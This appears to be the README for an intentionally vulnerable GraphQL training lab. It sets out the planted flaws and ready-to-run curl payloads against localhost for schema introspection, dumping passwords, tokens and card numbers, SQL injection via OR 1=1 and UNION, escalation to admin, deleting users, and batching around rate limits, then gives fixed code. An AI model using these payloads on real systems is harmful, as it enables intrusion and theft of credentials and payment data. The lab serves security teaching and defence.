# Lab 17 — GraphQL Introspection + Injection 🔴🔴

**Port:** `8017` | **Stack:** Node.js + PostgreSQL  
**GraphiQL UI:** `http://localhost:8017/graphql` (GET in browser)  
**Difficulty:** Intermediate–Advanced

---

## 🕳️ Security Loopholes

1. **Introspection Enabled** — Full schema discoverable, including sensitive field names (`password`, `secret_token`, `card_number`)
2. **GraphiQL Exposed in Production** — Interactive query IDE accessible to anyone
3. **No Field-Level Authorization** — Any query can fetch `password`, `secret_token`, `card_number`
4. **SQL Injection in Resolver** — `searchUser` builds raw SQL from GraphQL argument
5. **Unrestricted Mutations** — Any user can call `updateUser` and set `role: "admin"` or `deleteUser`

---

## 🎯 Attack Scenarios

### Scenario A — Schema Discovery via Introspection
```bash
docker compose up -d

# Full schema introspection
curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'

# Discover all query types
curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name description args { name } } } } }"}'

# Using graphql-voyager or InQL for visual schema mapping
# pip install inql
# inql -t http://localhost:8017/graphql
```

### Scenario B — Dump All Passwords and Tokens
```bash
# Query all sensitive fields at once
curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users { id username email password role secret_token } }"
  }'

# Dump all orders with full card numbers
curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ orders(user_id: 1) { id amount card_number } }"}'
```

### Scenario C — SQL Injection via GraphQL Argument
```bash
# Classic SQL injection in the searchUser resolver
curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\''  OR 1=1 --\") { id username password role secret_token } }"
  }'

# Extract via UNION
curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  --data-raw '{"query":"{ searchUser(username: \"x'\'' UNION SELECT id,username,email,password,role,secret_token FROM users LIMIT 1 --\") { id username password } }"}'
```

### Scenario D — Privilege Escalation via Mutation
```bash
# Escalate user 2 to admin
curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { updateUser(id: 2, role: \"admin\", password: \"hacked\") { id username role } }"}'

# Delete admin user (DoS)
curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { deleteUser(id: 1) }"}'
```

### Scenario E — Batching Attack (bypass rate limiting)
```bash
# GraphQL batching — send 1000 login attempts in one HTTP request
python3 -c "
import json
queries = [{'query': f'{{ searchUser(username: \"admin\") {{ password }} }}'} for _ in range(100)]
print(json.dumps(queries))
" | curl -X POST http://localhost:8017/graphql \
  -H "Content-Type: application/json" \
  -d @-
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `InQL` | `inql -t http://localhost:8017/graphql` |
| `graphql-voyager` | Visual schema explorer (browser) |
| Burp Suite | GraphQL-aware scanner extension |
| `clairvoyance` | Schema extraction without introspection |

---

## 🔐 How to Fix

```javascript
// 1. Disable introspection in production
const { NoSchemaIntrospectionCustomRule } = require('graphql');
app.use('/graphql', graphqlHTTP({
  schema,
  validationRules: process.env.NODE_ENV === 'production'
    ? [NoSchemaIntrospectionCustomRule] : [],
  graphiql: process.env.NODE_ENV !== 'production',
}));

// 2. Never expose sensitive fields in schema
// Remove password, secret_token, card_number from GraphQL types
// Create a separate PublicUser type without sensitive fields

// 3. Use parameterized queries in resolvers
searchUser: async ({ username }) => {
  const r = await pool.query('SELECT id, username, email FROM users WHERE username = $1', [username]);
  return r.rows[0];
},

// 4. Add field-level auth middleware
// 5. Rate limit and depth-limit queries to prevent abuse
const depthLimit = require('graphql-depth-limit');
validationRules: [depthLimit(3)]
```
